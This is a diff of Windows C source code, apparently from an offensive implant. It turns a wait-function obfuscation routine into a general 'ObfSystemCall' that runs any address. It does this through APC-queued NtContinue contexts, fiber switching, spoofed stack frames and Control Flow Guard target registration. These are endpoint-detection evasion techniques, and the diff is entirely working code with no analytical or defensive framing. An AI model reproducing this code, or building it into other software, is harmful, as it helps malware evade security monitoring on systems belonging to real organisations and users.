@@ -33,9 +33,9 @@ typedef struct
 	PVOID	Return;
 	PVOID	Slave;
 
-	HANDLE		Handle;
-	BOOLEAN		Alertable;
-	PLARGE_INTEGER	Timeout;
+	PVOID	Addr;
+	PVOID* 	Argv;
+	UINT32	Argc;
 } F_PARAM, *PF_PARAM; 
 
 typedef struct
@@ -294,7 +294,7 @@ static D_SEC( E ) VOID WINAPI ObjectFiber( _In_ PF_PARAM Fbr )
 
 		if ( NT_SUCCESS( Api.NtCreateEvent( &Evt, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) ) {
 			if ( NT_SUCCESS( Api.NtCreateThreadEx( &Th1, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Api.NtWaitForSingleObject, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 1, NULL ) ) ) {
-				if ( NT_SUCCESS( Api.NtCreateThreadEx( &Th2, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Api.NtWaitForSingleObject, NULL, TRUE, 0, 0x1000 * 2, 0x1000 * 1, NULL ) ) ) {
+				if ( NT_SUCCESS( Api.NtCreateThreadEx( &Th2, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Fbr->Addr, NULL, TRUE, 0, 0x1000 * 2, 0x1000 * 1, NULL ) ) ) {
 					Ini = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
 					if ( Ini == NULL ) {
 						goto Leave;
@@ -583,6 +583,7 @@ static D_SEC( E ) VOID WINAPI ObjectFiber( _In_ PF_PARAM Fbr )
 								if ( ! NT_SUCCESS( Api.NtQueueApcThread( Th1, Api.NtContinue, C_PTR( St2 ), FALSE, NULL ) ) ) goto Leave;
 								if ( ! NT_SUCCESS( Api.NtQueueApcThread( Th1, Api.NtContinue, C_PTR( End ), FALSE, NULL ) ) ) goto Leave;
 	
+								CfgAddAddr( PebGetModule( H_LIB_NTDLL ), Fbr->Addr );
 								CfgAddAddr( PebGetModule( H_LIB_NTDLL ), Api.NtContinue );
 								CfgAddAddr( PebGetModule( H_LIB_NTDLL ), Api.NtTestAlert );
 								CfgAddAddr( PebGetModule( H_LIB_NTDLL ), Api.NtResumeThread );
@@ -598,25 +599,39 @@ static D_SEC( E ) VOID WINAPI ObjectFiber( _In_ PF_PARAM Fbr )
 									Thd->ContextFlags = CONTEXT_FULL;
 
 								#if defined( _WIN64 )
-									Spf->Rip = U_PTR( Api.NtWaitForSingleObject );
-									Spf->Rsp = U_PTR( NtCurrentTeb()->NtTib.StackBase );
+									Spf->Rip  = U_PTR( Api.NtWaitForSingleObject );
+									Spf->Rsp  = U_PTR( NtCurrentTeb()->NtTib.StackBase );
 
-									Thd->Rip  = U_PTR( Api.NtWaitForSingleObject );
+									Thd->Rip  = U_PTR( Fbr->Addr );
 									Thd->Rsp -= U_PTR( 0x1000 );
-									Thd->Rcx  = U_PTR( Fbr->Handle );
-									Thd->Rdx  = U_PTR( Fbr->Alertable );
-									Thd->R8   = U_PTR( Fbr->Timeout );
+
+									if ( Fbr->Argc > 0 ) {
+										Thd->Rcx = C_PTR( Fbr->Argv[0] );
+									};
+									if ( Fbr->Argc > 1 ) { 
+										Thd->Rdx = C_PTR( Fbr->Argv[1] );
+									};
+									if ( Fbr->Argc > 2 ) {
+										Thd->R8  = C_PTR( Fbr->Argv[2] );
+									};
+									if ( Fbr->Argc > 3 ) { 
+										Thd->R9  = U_PTR( Fbr->Argv[3] );
+									};
+									for ( UINT32 Idx = 4 ; Idx < Fbr->Argc ; ++Idx ) {
+										*( ULONG_PTR volatile * )( Thd->Rsp + ( sizeof( ULONG_PTR ) * ( 1 + Idx ) ) ) = C_PTR( Fbr->Argv[ Idx ] );
+									};
 									*( ULONG_PTR volatile * )( Thd->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Fbr->Return );
 								#else
-									Spf->Eip = U_PTR( Api.NtWaitForSingleObject );
-									Spf->Esp = U_PTR( NtCurrentTeb()->NtTib.StackBase );
+									Spf->Eip  = U_PTR( Api.NtWaitForSingleObject );
+									Spf->Esp  = U_PTR( NtCurrentTeb()->NtTib.StackBase );
 
-									Thd->Eip  = U_PTR( Api.NtWaitForSingleObject );
+									Thd->Eip  = U_PTR( Fbr->Addr );
 									Thd->Esp -= U_PTR( 0x1000 );
+
+									for ( UINT32 Idx = 0 ; Idx < Fbr->Argc ; ++Idx ) {
+										*( ULONG_PTR volatile * )( Thd->Esp + ( sizeof( ULONG_PTR ) * ( 1 + Idx ) ) ) = C_PTR( Fbr->Argv[ Idx ] );
+									};
 									*( ULONG_PTR volatile * )( Thd->Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Fbr->Return );
-									*( ULONG_PTR volatile * )( Thd->Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( Fbr->Handle );
-									*( ULONG_PTR volatile * )( Thd->Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( Fbr->Alertable );
-									*( ULONG_PTR volatile * )( Thd->Esp + ( sizeof( ULONG_PTR ) * 0x3 ) ) = U_PTR( Fbr->Timeout );
 								#endif
 
 									if ( NT_SUCCESS( Api.NtSetContextThread( Th2, Thd ) ) ) {
@@ -738,7 +753,7 @@ Leave:
  * completion.
  *
 !*/
-D_SEC( E ) NTSTATUS NTAPI NtWaitForSingleObjectObf( _In_ HANDLE Handle, _In_ BOOLEAN Alertable, _In_ PLARGE_INTEGER Timeout )
+D_SEC( E ) NTSTATUS NTAPI ObfSystemCall( _In_ PVOID Addr, _In_ PVOID* Argv, _In_ UINT32 Argc )
 {
 	F_PARAM		Fbr;
 	UNICODE_STRING	Uni;
@@ -777,12 +792,12 @@ D_SEC( E ) NTSTATUS NTAPI NtWaitForSingleObjectObf( _In_ HANDLE Handle, _In_ BOO
 					Fbr.NtClose( Thd );
 				};
 				if ( Fbr.Return != NULL ) {
-					Fbr.Handle    = C_PTR( Handle );
-					Fbr.Alertable = Alertable;
-					Fbr.Timeout   = C_PTR( Timeout );
+					Fbr.Addr = C_PTR( Addr );
+					Fbr.Argv = C_PTR( Argv );
+					Fbr.Argc = Argc;
 					Fbr.SwitchToFiber( Fbr.Slave );
 
-					/* Get return address */
+					/* Get return value */
 					Nst = Fbr.ExitCode;
 				};
 				Fbr.DeleteFiber( Fbr.Slave );
